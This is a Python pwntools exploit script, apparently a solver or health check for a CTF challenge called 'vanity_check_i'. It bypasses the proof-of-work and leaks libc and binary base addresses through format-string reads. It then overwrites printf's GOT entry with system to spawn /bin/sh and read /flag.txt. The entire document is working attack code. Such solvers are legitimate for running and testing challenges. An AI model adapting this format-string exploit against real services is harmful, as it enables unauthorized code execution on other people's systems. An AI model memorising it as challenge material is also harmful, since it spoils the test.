#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("/home/user/vanity_check_i")
libc = ELF("/home/user/libc-2.31.so")
def test():
    conn = remote("localhost", 1337)
    def handle_pow(r):
        print(r.recvuntil(b'python3 '))
        print(r.recvuntil(b' solve '))
        challenge = r.recvline().decode('ascii').strip()
        p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
        solution = p.readall().strip()
        r.sendline(solution)
        print(r.recvuntil(b'Correct\n'))

    print(conn.recvuntil('== proof-of-work: '))
    if conn.recvline().startswith(b'enabled'):
        handle_pow(conn)

    #conn = elf.process()

    conn.recvline()
    conn.sendline("%34$p")
    libc.address = int(conn.recvline(), 16) - 0x1f0fc8
    info("libc @ " + hex(libc.address))

    conn.sendline("%35$p")
    elf.address = int(conn.recvline(), 16) - 0x1270
    info("elf @ " + hex(elf.address))

    conn.sendline(fmtstr_payload(6, writes={elf.got["printf"]:libc.symbols["system"]}))

    conn.recv()
    conn.sendline("/bin/sh")

    conn.sendline("cat /flag.txt")
    flag = conn.recvline()

    if b"idek" in flag:
        print(flag)
        return 0
    return 1

for _ in range(5):
    if test() == 0:
        exit(0)
exit(1)

